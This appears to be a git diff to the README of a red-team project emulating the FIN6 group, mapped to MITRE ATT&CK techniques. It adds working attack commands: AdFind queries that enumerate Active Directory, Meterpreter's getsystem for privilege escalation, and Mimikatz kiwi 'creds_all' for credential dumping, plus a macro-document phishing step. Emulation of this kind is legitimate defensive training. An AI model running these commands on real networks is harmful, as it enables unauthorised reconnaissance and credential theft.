@@ -23,7 +23,12 @@ The primary goal of this emulation is to provide a realistic representation of F
 
 #### Initial Access
 
-Spearphishing Attachment: T1566.001 , Command and Scripting Interpreter: PowerShell: T1059.001
+Spearphishing Attachment: T1566.001 
+
+
+#### Execution
+
+Command and Scripting Interpreter: PowerShell: T1059.001
 
 FIN6 has targeted victims with e-mails containing malicious attachments Craft a malicious Word document with embedded macros that execute the Metasploit PowerShell payload upon opening.
 
@@ -34,6 +39,40 @@ FIN6 has targeted victims with e-mails containing malicious attachments Craft a
 ![infectd_word_doc](Phase1/Screenshots/1.png)
 
 
+#### Discovery
+
+FIN6 USED AdFind.exe to Find all person objects and output the results to a text file, Identify all computer objects and output the results to a text file, Enumerate all Organizational Units (OUs) in the domain of the user running the command and output the results to a text file, Performs a full forest search and dumps trust objects to a text file, List subnets and output the results to a text file, List groups and output the results to a text file. 
+
+
+```cmd
+adfind.exe -f (objectcategory=person) > ad_users.txt             # Account Discovery: Domain Account (T1087.002)
+adfind.exe -f (objectcategory=computer) > ad_computers.txt       # Remote System Discovery (T1018) 
+adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt   # Domain Trust Discovery (T1482) 
+adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt                   # Domain Trust Discovery (T1482)
+adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt  # System Network Configuration Discovery (T1016)
+adfind.exe -f (objectcategory=group) > ad_group.txt              # Permission Groups Discovery: Domain Groups (T1069.002)
+```
+
+#### Privilege Escalation
+
+FIN6 used various methods to Escalate their Privilege
+
+FIN6 was reported to have escalated privileges to SYSTEM by using the named-pipe impersonation technique featured in the Metasploit framework
+Access Token Manipulation: (T1134)
+
+```sh
+getsystem -t 1
+```
+
+FIN6 was reported to use Mimikatz to make OS Credential Dumping. We Will use  Mimikatz from a Meterpreter session.
+OS Credential Dumping: LSASS Memory: T1003.001
+
+```sh
+load kiwi
+creds_all
+```
+
+![Privilege Escalation 1,2](Phase1/Screenshots/2.png)
 
 
 ## Credits
